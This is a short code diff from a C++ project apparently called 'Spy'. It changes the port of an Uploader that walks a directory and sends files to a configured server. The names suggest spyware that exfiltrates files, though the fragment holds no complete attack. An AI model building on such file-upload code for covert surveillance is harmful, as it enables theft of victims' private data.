@@ -65,7 +65,7 @@ DWORD Spy::upload_async(LPVOID * dir_path)
 	Uploader * uploader = NULL;
 	try
 	{
-		uploader = new Uploader(SPY_NET_SERVER_ADDR, SPY_NET_SERVER_PORT);
+		uploader = new Uploader(SPY_NET_SERVER_ADDR, SPY_NET_SERVER_UPL_PORT);
 		while (dir->next(file_name))
 		{
 			path_combine(file_path, _dir, file_name);
